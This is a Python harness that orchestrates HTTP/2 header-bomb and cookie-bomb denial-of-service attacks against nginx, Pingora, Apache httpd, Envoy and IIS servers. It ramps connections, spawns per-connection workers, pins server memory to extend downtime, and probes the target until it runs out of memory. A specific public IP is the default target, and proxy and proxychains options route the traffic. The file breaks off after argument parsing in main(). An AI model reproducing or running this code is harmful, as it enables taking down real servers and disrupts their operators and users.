#!/usr/bin/env python3
"""
HTTP/2 Bomb benchmark harness — logs every run, tries multiple strategies until OOM/degradation.
"""

from __future__ import annotations

import csv
import json
import os
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

PLUGIN = Path(__file__).resolve().parent.parent
BENCH_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(BENCH_DIR))

from attack_config import (  # noqa: E402
    AttackConfig,
    CookieAttackConfig,
    profile_apex,
    profile_apex_cookie_envoy,
    profile_apex_cookie_httpd,
    profile_apex_cookie_scaled,
    profile_apex_iis_mp,
    profile_apex_pingora,
    profile_apex_scaled,
    profile_churn,
    profile_efficiency,
    profile_max_impact,
    profile_sustain,
)
from cookie_bomb_enhanced import (  # noqa: E402
    bomb_connections_batched,
    close_cookie_connections,
    establish_cookie,
    hold_cookie_connections,
)
from h2_enhanced import (  # noqa: E402
    H2AttackEnhanced,
    bomb_connections,
    configure_h2_variant,
    establish_enhanced,
    hold_connections,
)
from tunnel import (  # noqa: E402
    TUNNEL_MODES,
    activate_tunnel,
    curl_proxy_args,
    load_tunnel_config,
    merge_tunnel_overrides,
)
from tunnel_runner import popen as tunnel_popen, run as tunnel_run  # noqa: E402
from variants import apex_modes_for_variant, get_variant, poc_script_path, set_poc_path  # noqa: E402
LOG_DIR = BENCH_DIR / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
CSV_PATH = LOG_DIR / "benchmark_results.csv"
JSONL_PATH = LOG_DIR / "benchmark_runs.jsonl"

DEFAULT_HOST = "69.62.121.168"
DEFAULT_PORT = 443
SOCKET_TIMEOUT = 300


@dataclass
class ServerProbe:
    ok: bool
    http_code: int | None
    latency_sec: float | None
    error: str | None = None


@dataclass
class RunResult:
    run_id: str
    timestamp: str
    strategy: str
    target: str
    connections_requested: int
    connections_established: int
    connections_bomb_ok: int
    connections_active_end: int
    wire_mb: float
    hold_sec: int
    bind_ips: list[str]
    probe_before: ServerProbe
    probe_during: ServerProbe | None
    probe_after: ServerProbe
    probe_worst_latency: float | None
    server_down: bool
    oom_likely: bool
    duration_sec: float
    notes: str = ""
    extra: dict[str, Any] = field(default_factory=dict)


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def probe_server(host: str, port: int = 443, timeout: float = 15.0) -> ServerProbe:
    t0 = time.monotonic()
    try:
        proc = tunnel_run(
            [
                "curl", "-sS", "-m", str(int(timeout)), "-o", "/dev/null",
                "-w", "%{http_code}",
                "-k", "--http2", *curl_proxy_args(), f"https://{host}:{port}/",
            ],
            capture_output=True,
            text=True,
            timeout=timeout + 2,
        )
        lat = time.monotonic() - t0
        code = int(proc.stdout.strip()) if proc.stdout.strip().isdigit() else None
        err = proc.stderr.strip() if proc.returncode != 0 else None
        return ServerProbe(ok=proc.returncode == 0 and code is not None, http_code=code, latency_sec=lat, error=err)
    except Exception as exc:
        return ServerProbe(ok=False, http_code=None, latency_sec=time.monotonic() - t0, error=str(exc))


def _monitor_during(
    host: str,
    stop: threading.Event,
    samples: list[ServerProbe],
    interval: float = 8.0,
    port: int = DEFAULT_PORT,
):
    while not stop.is_set():
        samples.append(probe_server(host, port))
        stop.wait(interval)


def run_cookie_attack(
    strategy: str,
    host: str,
    port: int,
    connections: int,
    cfg: CookieAttackConfig,
    bind_ips: list[str | None] | None = None,
    notes: str = "",
    variant_id: str = "httpd",
) -> RunResult:
    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    bind_ips = bind_ips or [None]
    spec = get_variant(variant_id)

    probe_before = probe_server(host, port)
    during_samples: list[ServerProbe] = []
    stop_mon = threading.Event()
    mon = threading.Thread(
        target=_monitor_during, args=(host, stop_mon, during_samples), kwargs={"port": port}, daemon=True
    )
    mon.start()

    conns = establish_cookie(host, port, connections, cfg, bind_ips, server_name=host)
    established = len(conns)
    bomb_ok, wire, bomb_errors = bomb_connections_batched(conns, cfg, server_name=host)

    if cfg.hold > 0:
        hold_cookie_connections(conns, cfg)

    active_end = sum(1 for c in conns if c.active)
    close_cookie_connections(conns)

    stop_mon.set()
    mon.join(timeout=5)
    probe_after = probe_server(host, port, timeout=20)
    worst = max((s.latency_sec for s in during_samples if s.latency_sec), default=None)
    probe_during = during_samples[-1] if during_samples else None
    server_down = any(not s.ok for s in during_samples) or not probe_after.ok
    oom_likely = server_down or (probe_after.http_code in (502, 503, 500) if probe_after.http_code else False)

    result = RunResult(
        run_id=run_id,
        timestamp=_now(),
        strategy=strategy,
        target=f"{host}:{port}",
        connections_requested=connections,
        connections_established=established,
        connections_bomb_ok=bomb_ok,
        connections_active_end=active_end,
        wire_mb=wire / 1024 / 1024,
        hold_sec=cfg.hold,
        bind_ips=[b or "default" for b in bind_ips],
        probe_before=probe_before,
        probe_during=probe_during,
        probe_after=probe_after,
        probe_worst_latency=worst,
        server_down=server_down,
        oom_likely=oom_likely,
        duration_sec=time.monotonic() - t0,
        notes=notes or f"cookie variant={cfg.variant} streams={cfg.streams} refs={cfg.refs}",
        extra={
            "variant": variant_id,
            "kind": spec.kind,
            "during_probe_count": len(during_samples),
            "attack_config": cfg.to_extra(),
            "est_server_mb": round(cfg.est_server_mb_per_conn() * bomb_ok, 1),
            "bomb_errors_sample": bomb_errors[:20],
            "bomb_error_count": len(bomb_errors),
        },
    )
    _persist(result)
    return result


def run_attack(
    strategy: str,
    host: str,
    port: int,
    connections: int,
    hold: int = 180,
    drip: int = 30,
    bomb_mode: str = "sequential",
    bind_ips: list[str | None] | None = None,
    notes: str = "",
    cfg: AttackConfig | None = None,
    variant: str = "nginx",
) -> RunResult:
    spec = get_variant(variant)
    if spec.kind == "cookie":
        cookie_cfg = profile_apex_cookie_httpd() if variant == "httpd" else profile_apex_cookie_envoy()
        return run_cookie_attack(strategy, host, port, connections, cookie_cfg, bind_ips, notes, variant)
    if spec.kind == "iis":
        return run_iis_apex_mp(host, port, preset_name="8gb")

    set_poc_path(variant)
    configure_h2_variant(variant)
    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    bind_ips = bind_ips or [None]

    if cfg is None:
        cfg = profile_max_impact()
        cfg = AttackConfig(
            streams=128,
            headers=32000,
            hold=hold,
            drip=drip,
            hold_mode="drip",
            bomb_mode=bomb_mode,
        )
    else:
        cfg = AttackConfig(
            streams=cfg.streams,
            headers=cfg.headers,
            hold=hold if hold != 180 else cfg.hold,
            drip=drip if drip != 30 else cfg.drip,
            hold_mode=cfg.hold_mode,
            waves_per_conn=cfg.waves_per_conn,
            wave_gap_sec=cfg.wave_gap_sec,
            conn_stagger_sec=cfg.conn_stagger_sec,
            bomb_mode=bomb_mode if bomb_mode != "sequential" else cfg.bomb_mode,
            bomb_batch_size=cfg.bomb_batch_size,
            bomb_batch_gap_sec=cfg.bomb_batch_gap_sec,
            drip_bytes=cfg.drip_bytes,
        )

    probe_before = probe_server(host, port)
    during_samples: list[ServerProbe] = []
    stop_mon = threading.Event()
    mon = threading.Thread(
        target=_monitor_during, args=(host, stop_mon, during_samples), kwargs={"port": port}, daemon=True
    )
    mon.start()

    conns = establish_enhanced(host, port, connections, cfg, bind_ips)
    established = len(conns)
    bomb_ok, wire, bomb_errors = bomb_connections(conns, cfg)
    active_mid = sum(1 for c in conns if c.active)

    if cfg.hold > 0 and active_mid:
        hold_connections(conns, cfg)

    active_end = sum(1 for c in conns if c.active)
    for c in conns:
        c.close()

    stop_mon.set()
    mon.join(timeout=5)
    probe_after = probe_server(host, port, timeout=20)

    worst = max((s.latency_sec for s in during_samples if s.latency_sec), default=None)
    probe_during = during_samples[-1] if during_samples else None
    server_down = any(not s.ok for s in during_samples) or not probe_after.ok
    oom_likely = server_down or (probe_after.http_code in (502, 503, 500) if probe_after.http_code else False)

    result = RunResult(
        run_id=run_id,
        timestamp=_now(),
        strategy=strategy,
        target=f"{host}:{port}",
        connections_requested=connections,
        connections_established=established,
        connections_bomb_ok=bomb_ok,
        connections_active_end=active_end,
        wire_mb=wire / 1024 / 1024,
        hold_sec=cfg.hold,
        bind_ips=[b or "default" for b in bind_ips],
        probe_before=probe_before,
        probe_during=probe_during,
        probe_after=probe_after,
        probe_worst_latency=worst,
        server_down=server_down,
        oom_likely=oom_likely,
        duration_sec=time.monotonic() - t0,
        notes=notes or f"streams={cfg.streams} headers={cfg.headers} waves={cfg.waves_per_conn} mode={cfg.hold_mode}",
        extra={
            "variant": variant,
            "kind": spec.kind,
            "during_probe_count": len(during_samples),
            "during_failures": sum(1 for s in during_samples if not s.ok),
            "attack_config": cfg.to_extra(),
            "est_server_mb": round(cfg.est_server_mb_per_conn() * bomb_ok, 1),
            "bomb_errors_sample": bomb_errors[:20],
            "bomb_error_count": len(bomb_errors),
        },
    )
    _persist(result)
    return result


def run_iis_apex_mp(host: str, port: int, preset_name: str = "8gb") -> RunResult:
    """Launch IIS multiprocess orchestrator (Windows) or print command on Linux."""
    from iis_apex_runner import build_powershell_command, run_on_windows

    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    preset = profile_apex_iis_mp(preset_name)
    probe_before = probe_server(host, port)

    if sys.platform == "win32":
        code, out = run_on_windows(host, port, preset)
        notes = f"win32 orchestrator exit={code}"
        extra_out = out[-4000:] if out else ""
    else:
        cmd = build_powershell_command(host, port, preset)
        notes = f"linux stub — run on Windows: {cmd}"
        extra_out = cmd
        code = 0

    probe_after = probe_server(host, port, timeout=20)
    result = RunResult(
        run_id=run_id,
        timestamp=_now(),
        strategy=f"apex_iis_mp_{preset_name}",
        target=f"{host}:{port}",
        connections_requested=preset.total_connections(),
        connections_established=preset.processes if sys.platform == "win32" else 0,
        connections_bomb_ok=0,
        connections_active_end=-1,
        wire_mb=0.0,
        hold_sec=0,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=None,
        probe_after=probe_after,
        probe_worst_latency=None,
        server_down=not probe_after.ok,
        oom_likely=not probe_after.ok,
        duration_sec=time.monotonic() - t0,
        notes=notes,
        extra={
            "variant": "microsoft-iis",
            "kind": "iis",
            "preset": preset_name,
            "processes": preset.processes,
            "orchestrator_output": extra_out,
            "exit_code": code,
        },
    )
    _persist(result)
    print(notes, flush=True)
    if sys.platform != "win32":
        print("\n" + extra_out, flush=True)
    return result


def _persist(r: RunResult) -> None:
    row = {
        "run_id": r.run_id,
        "timestamp": r.timestamp,
        "strategy": r.strategy,
        "target": r.target,
        "connections_requested": r.connections_requested,
        "connections_established": r.connections_established,
        "connections_bomb_ok": r.connections_bomb_ok,
        "connections_active_end": r.connections_active_end,
        "wire_mb": round(r.wire_mb, 2),
        "hold_sec": r.hold_sec,
        "probe_before_code": r.probe_before.http_code,
        "probe_after_code": r.probe_after.http_code,
        "probe_worst_latency": round(r.probe_worst_latency or 0, 3),
        "server_down": r.server_down,
        "oom_likely": r.oom_likely,
        "duration_sec": round(r.duration_sec, 1),
        "notes": r.notes,
    }

    write_header = not CSV_PATH.exists()
    with CSV_PATH.open("a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(row.keys()))
        if write_header:
            w.writeheader()
        w.writerow(row)

    with JSONL_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps({**row, "full": asdict(r)}, default=str) + "\n")

    print(json.dumps(row, indent=2), flush=True)


def run_ramp(host: str, steps: list[int], **kwargs) -> RunResult | None:
    last: RunResult | None = None
    for n in steps:
        print(f"\n>>> RAMP {n} connections <<<", flush=True)
        last = run_attack(
            strategy=f"ramp_seq_{n}",
            host=host,
            port=DEFAULT_PORT,
            connections=n,
            bomb_mode="sequential",
            notes=f"ramp step {n}",
            **kwargs,
        )
        if last.server_down or last.connections_bomb_ok < n // 2:
            print(f"Stopping ramp at {n}: down={last.server_down} bomb_ok={last.connections_bomb_ok}", flush=True)
            time.sleep(30)
            if probe_server(host).ok:
                continue
            return last
        time.sleep(15)
    return last


def run_cumulative_waves(
    host: str,
    total: int,
    wave_size: int = 5,
    stagger: int = 3,
    hold: int = 300,
    variant: str = "nginx",
    port: int = DEFAULT_PORT,
) -> None:
    """Launch wave processes that stay holding — cumulative memory pressure."""
    set_poc_path(variant)
    py = sys.executable
    script = poc_script_path(variant)
    cfg = profile_max_impact()
    waves = (total + wave_size - 1) // wave_size
    procs: list[subprocess.Popen] = []
    probe_before = probe_server(host)

    run_meta = {
        "run_id": str(uuid.uuid4())[:8],
        "timestamp": _now(),
        "strategy": f"cumulative_waves_{total}",
        "waves": waves,
        "wave_size": wave_size,
    }
    print(json.dumps(run_meta), flush=True)

    for w in range(waves):
        log_path = LOG_DIR / f"wave_{run_meta['run_id']}_{w+1}.log"
        env = os.environ.copy()
        env["PYTHONUNBUFFERED"] = "1"
        p = tunnel_popen(
            [py, str(script), "--host", host, "--port", str(port),
             "-n", str(wave_size), "--streams", str(cfg.streams), "--headers", str(cfg.headers),
             "--hold", str(hold), "--drip-interval", "30", "-v"],
            stdout=log_path.open("w"),
            stderr=subprocess.STDOUT,
            env=env,
        )
        procs.append(p)
        print(f"  wave {w+1}/{waves} pid={p.pid}", flush=True)
        time.sleep(stagger)

    samples: list[ServerProbe] = []
    deadline = time.monotonic() + min(hold, 120)
    while time.monotonic() < deadline:
        samples.append(probe_server(host))
        time.sleep(10)

    probe_after = probe_server(host, timeout=20)
    wire_mb = 0.0
    bomb_ok = 0
    for i, p in enumerate(procs):
        lp = LOG_DIR / f"wave_{run_meta['run_id']}_{i+1}.log"
        if lp.exists():
            txt = lp.read_text(errors="replace")
            if "Total wire uploaded:" in txt:
                for line in txt.splitlines():
                    if "Total wire uploaded:" in line:
                        try:
                            wire_mb += float(line.split("MB")[0].split()[-1])
                        except ValueError:
                            pass
            if "Phase 1 complete:" in txt and "SEND FAILED" not in txt.split("Phase 1 complete:")[0][-200:]:
                bomb_ok += wave_size

    result = RunResult(
        run_id=run_meta["run_id"],
        timestamp=_now(),
        strategy=f"cumulative_waves_{total}",
        target=f"{host}:{port}",
        connections_requested=total,
        connections_established=len(procs) * wave_size,
        connections_bomb_ok=bomb_ok,
        connections_active_end=-1,
        wire_mb=wire_mb,
        hold_sec=hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=samples[-1] if samples else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in samples if s.latency_sec), default=None),
        server_down=any(not s.ok for s in samples),
        oom_likely=not probe_after.ok,
        duration_sec=0,
        notes=f"{waves} waves stagger={stagger}s hold={hold}s (procs still running)",
        extra={
            "variant": variant,
            "kind": get_variant(variant).kind,
            "pids": [p.pid for p in procs],
            "wave_logs": str(LOG_DIR),
        },
    )
    _persist(result)

    print(f"Cumulative waves launched — {len(procs)} processes still holding. NOT waiting full hold.", flush=True)


def _count_mp_workers(log_dir: Path, count: int) -> tuple[int, float]:
    import re

    bomb_ok = 0
    wire_bytes = 0.0
    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        if not lp.exists():
            continue
        txt = lp.read_text(errors="replace")
        if "WORKER_BOMB_OK" in txt or "WORKER_OK" in txt:
            bomb_ok += 1
        m = re.search(r"WORKER_BOMB_OK conn=\d+ wire=([\d.eE+-]+)", txt)
        if not m:
            m = re.search(r"WORKER_OK conn=\d+ wire=([\d.eE+-]+)", txt)
        if m:
            try:
                wire_bytes += float(m.group(1))
            except ValueError:
                pass
    return bomb_ok, wire_bytes / 1024 / 1024


def run_multiprocess(
    host: str,
    count: int,
    hold: int = 240,
    stagger: float = 0.5,
    cfg: AttackConfig | None = None,
    port: int = DEFAULT_PORT,
    strategy: str | None = None,
    variant: str = "nginx",
    cookie_cfg: CookieAttackConfig | None = None,
) -> RunResult:
    """One OS process per connection — avoids GIL/thread write contention."""
    spec = get_variant(variant)
    if spec.kind == "cookie":
        return run_cookie_multiprocess(
            host, count, port, cookie_cfg or profile_apex_cookie_httpd(), variant, strategy
        )

    set_poc_path(variant)
    configure_h2_variant(variant)
    cfg = cfg or profile_efficiency()
    py = sys.executable
    worker = BENCH_DIR / "single_conn_worker.py"
    probe_before = probe_server(host, port)
    during: list[ServerProbe] = []
    stop = threading.Event()
    mon = threading.Thread(
        target=_monitor_during, args=(host, stop, during, 6.0), kwargs={"port": port}, daemon=True
    )
    mon.start()

    t0 = time.monotonic()
    procs: list[subprocess.Popen] = []
    log_dir = LOG_DIR / f"mp_{int(t0)}"
    log_dir.mkdir(parents=True, exist_ok=True)

    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        p = tunnel_popen(
            [py, str(worker), "--host", host, "--port", str(port), "--conn-id", str(i),
             "--streams", str(cfg.streams), "--headers", str(cfg.headers),
             "--hold", str(hold if hold != 240 else cfg.hold),
             "--drip", str(cfg.drip),
             "--hold-mode", cfg.hold_mode,
             "--waves", str(cfg.waves_per_conn),
             "--wave-gap", str(cfg.wave_gap_sec)],
            stdout=lp.open("w"),
            stderr=subprocess.STDOUT,
        )
        procs.append(p)
        time.sleep(stagger)

    spawn_sec = count * stagger + 10
    bomb_deadline = time.monotonic() + spawn_sec + 180
    last_ok = -1
    ok_workers = 0
    wire_mb = 0.0

    while time.monotonic() < bomb_deadline:
        ok_workers, wire_mb = _count_mp_workers(log_dir, count)
        if ok_workers >= count:
            break
        if ok_workers == last_ok and time.monotonic() > t0 + spawn_sec + 90:
            break
        last_ok = ok_workers
        time.sleep(4)

    monitor_until = time.monotonic() + min(hold, 120)
    while time.monotonic() < monitor_until:
        during.append(probe_server(host, port))
        time.sleep(8)

    ok_workers, wire_mb = _count_mp_workers(log_dir, count)
    probe_after = probe_server(host, port, timeout=20)
    stop.set()
    mon.join(timeout=3)

    strat = strategy or f"multiprocess_{count}"
    result = RunResult(
        run_id=str(uuid.uuid4())[:8],
        timestamp=_now(),
        strategy=strat,
        target=f"{host}:{port}",
        connections_requested=count,
        connections_established=len(procs),
        connections_bomb_ok=ok_workers,
        connections_active_end=sum(1 for p in procs if p.poll() is None),
        wire_mb=round(wire_mb, 2),
        hold_sec=hold if hold != 240 else cfg.hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=during[-1] if during else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in during if s.latency_sec), default=None),
        server_down=any(not s.ok for s in during),
        oom_likely=not probe_after.ok or (probe_after.http_code or 0) >= 500,
        duration_sec=time.monotonic() - t0,
        notes=f"workers={count} bomb_ok={ok_workers} wire_mb={wire_mb:.1f} logs={log_dir}",
        extra={
            "variant": variant,
            "kind": spec.kind,
            "worker_log_dir": str(log_dir),
            "attack_config": cfg.to_extra(),
        },
    )
    _persist(result)
    print(f"Multiprocess: {ok_workers}/{count} workers bomb OK, wire={wire_mb:.1f} MB", flush=True)
    return result


def run_cookie_multiprocess(
    host: str,
    count: int,
    port: int,
    cfg: CookieAttackConfig,
    variant: str,
    strategy: str | None = None,
    stagger: float = 0.25,
) -> RunResult:
    py = sys.executable
    worker = BENCH_DIR / "single_cookie_worker.py"
    probe_before = probe_server(host, port)
    during: list[ServerProbe] = []
    stop = threading.Event()
    mon = threading.Thread(
        target=_monitor_during, args=(host, stop, during, 6.0), kwargs={"port": port}, daemon=True
    )
    mon.start()

    t0 = time.monotonic()
    procs: list[subprocess.Popen] = []
    log_dir = LOG_DIR / f"cookie_mp_{int(t0)}"
    log_dir.mkdir(parents=True, exist_ok=True)

    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        argv = [
            py, str(worker), "--host", host, "--port", str(port),
            "--variant", cfg.variant,
            "--conn-id", str(i),
            "--streams", str(cfg.streams),
            "--refs", str(cfg.refs),
            "--hold", str(cfg.hold),
            "--drip", str(cfg.drip),
            "--hold-mode", cfg.hold_mode,
            "--path", cfg.path,
            "--cookie-value-size", str(cfg.cookie_value_size),
            "--server-name", host,
        ]
        p = tunnel_popen(argv, stdout=lp.open("w"), stderr=subprocess.STDOUT)
        procs.append(p)
        time.sleep(stagger)

    spawn_sec = count * stagger + 10
    bomb_deadline = time.monotonic() + spawn_sec + 180
    ok_workers, wire_mb = 0, 0.0
    while time.monotonic() < bomb_deadline:
        ok_workers, wire_mb = _count_mp_workers(log_dir, count)
        if ok_workers >= count:
            break
        time.sleep(4)

    monitor_until = time.monotonic() + min(cfg.hold, 120)
    while time.monotonic() < monitor_until:
        during.append(probe_server(host, port))
        time.sleep(8)

    ok_workers, wire_mb = _count_mp_workers(log_dir, count)
    probe_after = probe_server(host, port, timeout=20)
    stop.set()
    mon.join(timeout=3)

    strat = strategy or f"apex_cookie_mp_{count}"
    result = RunResult(
        run_id=str(uuid.uuid4())[:8],
        timestamp=_now(),
        strategy=strat,
        target=f"{host}:{port}",
        connections_requested=count,
        connections_established=len(procs),
        connections_bomb_ok=ok_workers,
        connections_active_end=sum(1 for p in procs if p.poll() is None),
        wire_mb=round(wire_mb, 2),
        hold_sec=cfg.hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=during[-1] if during else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in during if s.latency_sec), default=None),
        server_down=any(not s.ok for s in during),
        oom_likely=not probe_after.ok or (probe_after.http_code or 0) >= 500,
        duration_sec=time.monotonic() - t0,
        notes=f"cookie workers={count} bomb_ok={ok_workers}",
        extra={
            "variant": variant,
            "kind": "cookie",
            "worker_log_dir": str(log_dir),
            "attack_config": cfg.to_extra(),
        },
    )
    _persist(result)
    return result


def run_optimized_single_client_oom(host: str, cycles: int = 25) -> None:
    """
    Efficiency profile: 4096 headers × 256 streams, 80 conn/cycle, hard_hold 12s drip.
    Churn cycles stack glibc retention; hard_hold pins active allocations.
    """
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=65,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
        bomb_mode="sequential",
        conn_stagger_sec=0.015,
    )
    print("=== OPTIMIZED SINGLE-CLIENT OOM (v2) ===")
    print(f"Target: {host}")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. RAM/cycle @80 conn: {cfg.est_server_mb_per_conn() * 80:.0f} MiB\n")

    degraded_streak = 0
    for c in range(cycles):
        print(f"--- Cycle {c + 1}/{cycles} ---")
        r = run_attack(
            f"opt_oom_v2_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=80,
            cfg=cfg,
            notes=f"optimized v2 cycle {c + 1}",
        )
        if r and (r.server_down or (r.probe_after.http_code or 0) >= 500 or (r.probe_after.latency_sec or 0) > 5):
            degraded_streak += 1
            print(f">>> Degraded (streak={degraded_streak}) <<<")
        else:
            degraded_streak = max(0, degraded_streak - 1)
        time.sleep(0.8 if degraded_streak else 1.5)

    print(f"\n=== OPTIMIZED OOM COMPLETE — logs: {CSV_PATH} ===")


def run_churn(host: str, cycles: int = 40, connections: int = 45) -> None:
    """Fire-and-forget + multi-wave: max allocation churn, minimal client wire."""
    cfg = profile_churn()
    print("=== CHURN MODE (fire-and-forget + 2 waves/conn) ===")
    print(f"Config: {cfg.to_extra()}\n")

    for c in range(cycles):
        print(f"--- Churn {c + 1}/{cycles} ---")
        run_attack(
            f"churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=connections,
            cfg=cfg,
        )
        time.sleep(0.4)

    p = probe_server(host, timeout=20)
    print(f"Post-churn probe: code={p.http_code} lat={p.latency_sec}s ok={p.ok}")


def run_apex(
    host: str,
    connections: int = 55,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Apex: 64×2 waves, batched bombs, respects nginx 128-stream limit."""
    if variant == "pingora":
        cfg = profile_apex_pingora()
    else:
        cfg = profile_apex()
    print(f"=== APEX MODE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex", host, port, connections, cfg=cfg, variant=variant)


def run_apex_scaled(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Scale to N conn with ~2 MB wire each — batched parallel, 128 streams/conn."""
    cfg = profile_apex_scaled(connections)
    print(f"=== APEX SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex_scaled", host, port, connections, cfg=cfg, variant=variant)


def run_apex_multiprocess(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """One process per connection — bypasses thread/GIL write contention."""
    cfg = profile_apex_scaled(connections)
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=cfg.hold,
        drip=cfg.drip,
        hold_mode=cfg.hold_mode,
        waves_per_conn=1,
        bomb_mode="sequential",
    )
    print(f"=== APEX MULTIPROCESS ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_multiprocess(
        host, connections, hold=cfg.hold, stagger=0.25, cfg=cfg, port=port,
        strategy=f"apex_mp_{connections}", variant=variant,
    )


def run_apex_cookie(
    host: str,
    connections: int = 44,
    port: int = 10080,
    variant: str = "httpd",
) -> RunResult:
    cfg = profile_apex_cookie_httpd() if variant == "httpd" else profile_apex_cookie_envoy()
    print(f"=== APEX COOKIE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(f"apex_cookie_{variant}", host, port, connections, cfg, variant_id=variant)


def run_apex_cookie_scaled(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(
        f"apex_cookie_scaled_{variant}", host, port, connections, cfg, variant_id=variant
    )


def run_apex_cookie_multiprocess(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE MP ({variant}) ===\n")
    return run_cookie_multiprocess(
        host, connections, port, cfg, variant, strategy=f"apex_cookie_mp_{connections}"
    )


def run_pipelined_sustain(host: str, holders: int = 15, churn_cycles: int = 12) -> None:
    """
    Background hard-hold workers + foreground churn waves.
    Extends downtime: holders pin memory while churn adds glibc retention.
    """
    cfg_hold = profile_sustain()
    cfg_hold = AttackConfig(
        streams=128,
        headers=12000,
        hold=900,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
    )
    cfg_churn = profile_churn()

    print("=== PIPELINED SUSTAIN ===")
    print(f"Holders: {holders} | Churn cycles: {churn_cycles}")

    py = sys.executable
    worker = BENCH_DIR / "single_conn_worker.py"
    log_dir = LOG_DIR / f"pipelined_{int(time.time())}"
    log_dir.mkdir(parents=True, exist_ok=True)
    procs: list[subprocess.Popen] = []

    for i in range(holders):
        lp = log_dir / f"holder_{i}.log"
        p = tunnel_popen(
            [py, str(worker), "--host", host, "--conn-id", str(i),
             "--streams", str(cfg_hold.streams), "--headers", str(cfg_hold.headers),
             "--hold", str(cfg_hold.hold), "--drip", str(cfg_hold.drip),
             "--hold-mode", "hard_hold"],
            stdout=lp.open("w"),
            stderr=subprocess.STDOUT,
        )
        procs.append(p)
        time.sleep(0.3)

    stop = threading.Event()
    samples: list[ServerProbe] = []
    mon = threading.Thread(target=_monitor_during, args=(host, stop, samples, 5.0), daemon=True)
    mon.start()

    for c in range(churn_cycles):
        run_attack(
            f"pipelined_churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=40,
            cfg=cfg_churn,
        )
        time.sleep(0.5)

    stop.set()
    mon.join(timeout=3)
    probe_after = probe_server(host, timeout=20)
    fails = sum(1 for s in samples if not s.ok)
    print(f"Pipelined done: probe_failures={fails}/{len(samples)} after={probe_after.http_code} lat={probe_after.latency_sec}")
    print(f"Holder logs: {log_dir} ({sum(1 for p in procs if p.poll() is None)} still running)")


def run_sustained(host: str, connections: int = 40, cycles: int = 10, hold: int = 10, drip: int = 5) -> None:
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=hold,
        drip=drip,
        hold_mode="hard_hold",
    )
    for c in range(cycles):
        run_attack(f"sustained_{c + 1}", host, DEFAULT_PORT, connections, cfg=cfg)
        time.sleep(1)


def main() -> None:
    import argparse

    p = argparse.ArgumentParser(description="HTTP/2 bomb benchmark harness")
    p.add_argument("--host", default=DEFAULT_HOST)
    p.add_argument("--port", type=int, default=DEFAULT_PORT)
    p.add_argument("--variant", default="nginx", help="nginx|pingora|httpd|envoy|iis|microsoft-iis")
    p.add_argument("--iis-preset", default="8gb", choices=["8gb", "32gb", "64gb", "96gb"])
    p.add_argument("--mode", choices=[
        "ramp", "burst", "cumulative", "multiprocess", "sustained",
        "optimized_oom", "churn", "apex", "apex_scaled", "apex_mp",
        "apex_cookie", "apex_cookie_scaled", "apex_cookie_mp", "apex_iis_mp",
        "pipelined_sustain", "full_campaign",
    ], default="full_campaign")
    p.add_argument("--connections", type=int, default=50)
    p.add_argument("--tunnel-mode", choices=list(TUNNEL_MODES), default=None, help="Tunnel routing mode")
    p.add_argument("--proxy-url", default=None, help="Proxy URL (socks5:// or http://)")
    p.add_argument("--proxychains-conf", default=None, help="proxychains4 config path")
    p.add_argument("--tunnel-config", default=None, help="Load tunnel profile JSON")
    args = p.parse_args()

    tunnel_cfg = load_tunnel_config(args.tunnel_config)
